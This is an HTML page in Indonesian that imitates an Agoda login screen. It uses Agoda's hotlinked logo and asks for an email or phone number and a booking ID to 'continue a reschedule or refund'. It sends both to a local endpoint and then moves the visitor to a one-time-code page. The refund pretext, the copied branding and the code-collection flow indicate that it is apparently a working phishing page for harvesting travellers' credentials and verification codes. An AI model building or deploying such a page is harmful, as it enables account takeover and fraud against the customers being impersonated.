<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login ke Agoda</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f0f4ff 0%, #ffffff 50%, #f0f4ff 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 32px;
        }

        .back-button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            height: 40px;
            margin-bottom: 24px;
            background: #f5f5f5;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .back-button:hover {
            background: #efefef;
        }

        .back-button svg {
            width: 20px;
            height: 20px;
            color: #333;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo {
            height: 42px;
            margin-bottom: 24px;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }

        .method-toggle {
            display: flex;
            gap: 12px;
            margin-bottom: 32px;
        }

        .method-btn {
            flex: 1;
            padding: 12px 16px;
            border: none;
            border-radius: 24px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .method-btn.active {
            background: #0066cc;
            color: white;
            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
        }

        .method-btn.inactive {
            background: #f5f5f5;
            color: #333;
        }

        .method-btn.inactive:hover {
            background: #efefef;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            font-family: inherit;
            transition: all 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
            background: #f8faff;
        }

        .form-input:disabled {
            background: #f5f5f5;
            color: #999;
            cursor: not-allowed;
        }

        .form-input.error {
            border-color: #dc2626;
            background: #fef2f2;
        }

        .submit-btn {
            width: 100%;
            padding: 14px 16px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
        }

        .submit-btn:hover:not(:disabled) {
            background: #0052a3;
            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 24px 0;
            color: #999;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #ddd;
        }

        .alternative-login {
            text-align: center;
            margin-top: 24px;
        }

        .alternative-login p {
            font-size: 13px;
            color: #666;
            margin-bottom: 12px;
        }

        .alternative-login a {
            color: #0066cc;
            font-weight: 600;
            text-decoration: none;
            transition: color 0.2s;
        }

        .alternative-login a:hover {
            color: #0052a3;
        }

        .error-message {
            padding: 12px;
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 8px;
            color: #dc2626;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #eee;
            text-align: center;
            font-size: 12px;
            color: #999;
            line-height: 1.6;
        }

        .footer a {
            color: #0066cc;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .container {
                padding: 32px 20px;
            }

            .title {
                font-size: 24px;
            }

            .form-input {
                padding: 14px;
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://cdn6.agoda.net/images/kite-js/logo/agoda/color-default.svg" alt="Agoda Logo" class="logo">
            <br><br>
            <h4 class="title">Login ke Agoda</h4>
            <p class="subtitle">Masukkan email atau nomor telepon untuk melanjutkan reschedule atau refund.</p>
        </div>


        <div class="method-toggle">
            <button class="method-btn active" id="emailBtn" onclick="switchMethod('email')">
                <svg xmlns="http://w3.org" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
  <polyline points="22,6 12,13 2,6"></polyline>
</svg>

                Email
            </button>
            <button class="method-btn inactive" id="phoneBtn" onclick="switchMethod('phone')">
                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M11 1H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2zm-1 13H6v-1h4v1zm1-3H4V4h7v7z"/>
                </svg>
                Telepon
            </button>
        </div>

        <div id="errorMessage" class="error-message"></div>

        <form onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label class="form-label" id="inputLabel">Email</label>
                <input 
                    type="email" 
                    id="emailOrPhone" 
                    class="form-input" 
                    placeholder="nama@contoh.com"
                    required
                >
            </div>

            <div class="form-group">
                <label class="form-label">ID Pesanan</label>
                <input 
                    type="text" 
                    id="orderId" 
                    class="form-input" 
                    placeholder="Masukkan ID Pesanan (angka saja)"
                    inputmode="numeric"
                    required
                    onkeypress="return /[0-9]/.test(String.fromCharCode(event.which))"
                >
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">
                <span id="submitText">Lanjutkan</span>
            </button>
        </form>

        <div class="footer">
            <p>Dengan masuk ke akun, saya menyetujui <a href="#">Ketentuan Penggunaan</a> dan <a href="#">Kebijakan Privasi</a> Agoda.</p>
        </div>
    </div>

    <script>
        let currentMethod = 'email';

        function switchMethod(method) {
            currentMethod = method;
            const emailBtn = document.getElementById('emailBtn');
            const phoneBtn = document.getElementById('phoneBtn');
            const inputLabel = document.getElementById('inputLabel');
            const emailOrPhoneInput = document.getElementById('emailOrPhone');

            if (method === 'email') {
                emailBtn.classList.add('active');
                emailBtn.classList.remove('inactive');
                phoneBtn.classList.remove('active');
                phoneBtn.classList.add('inactive');
                inputLabel.textContent = 'Email';
                emailOrPhoneInput.type = 'email';
                emailOrPhoneInput.placeholder = 'nama@contoh.com';
            } else {
                phoneBtn.classList.add('active');
                phoneBtn.classList.remove('inactive');
                emailBtn.classList.remove('active');
                emailBtn.classList.add('inactive');
                inputLabel.textContent = 'Nomor Telepon';
                emailOrPhoneInput.type = 'tel';
                emailOrPhoneInput.placeholder = '+62 812 3456 7890';
            }

            emailOrPhoneInput.value = '';
            document.getElementById('errorMessage').classList.remove('show');
        }

        function validateOrderId(value) {
            return /^\d+$/.test(value);
        }

        async function handleSubmit(event) {
            event.preventDefault();

            const emailOrPhone = document.getElementById('emailOrPhone').value.trim();
            const orderId = document.getElementById('orderId').value.trim();
            const errorMessage = document.getElementById('errorMessage');
            const submitBtn = document.getElementById('submitBtn');
            const submitText = document.getElementById('submitText');

            errorMessage.classList.remove('show');

            if (!emailOrPhone) {
                errorMessage.textContent = 'Email atau nomor telepon harus diisi';
                errorMessage.classList.add('show');
                return;
            }

            if (!orderId) {
                errorMessage.textContent = 'ID Pesanan harus diisi';
                errorMessage.classList.add('show');
                return;
            }

            if (!validateOrderId(orderId)) {
                errorMessage.textContent = 'ID Pesanan hanya boleh berisi angka';
                errorMessage.classList.add('show');
                return;
            }

            // Show loading state
            submitBtn.disabled = true;
            submitText.innerHTML = '<span class="spinner"></span> Memproses...';

            try {
                // Simulate API call
                const response = await fetch('/api/trpc/login.submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        emailOrPhone,
                        orderId,
                    }),
                });

                const data = await response.json();

                if (data.result && data.result.data && data.result.data.success) {
                    // Redirect to OTP page
                    window.location.href = `/otp?sessionId=${data.result.data.sessionId}`;
                } else {
                    errorMessage.textContent = data.result?.data?.error || 'Gagal memproses login. Silakan coba lagi.';
                    errorMessage.classList.add('show');
                }
            } catch (error) {
                errorMessage.textContent = 'Gagal memproses login. Silakan coba lagi.';
                errorMessage.classList.add('show');
                console.error('Error:', error);
            } finally {
                submitBtn.disabled = false;
                submitText.textContent = 'Lanjutkan';
            }
        }

        // Prevent non-numeric input in Order ID field
        document.getElementById('orderId').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
